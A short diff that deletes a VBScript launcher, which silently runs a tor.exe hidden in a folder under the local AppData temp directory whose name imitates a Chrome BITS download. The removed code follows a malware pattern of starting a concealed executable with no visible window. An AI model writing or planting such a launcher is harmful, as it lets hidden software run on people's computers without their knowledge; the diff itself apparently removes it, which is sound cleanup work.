@@ -1,6 +1,0 @@
-Set Shell = CreateObject("WScript.Shell")
-
-localAppData = Shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
-exePath = localAppData & "\\temp\\..chrome_BITS_4288_5330238700281374567431342678\\tor.exe"
-
-Shell.Run exePath, 0, False
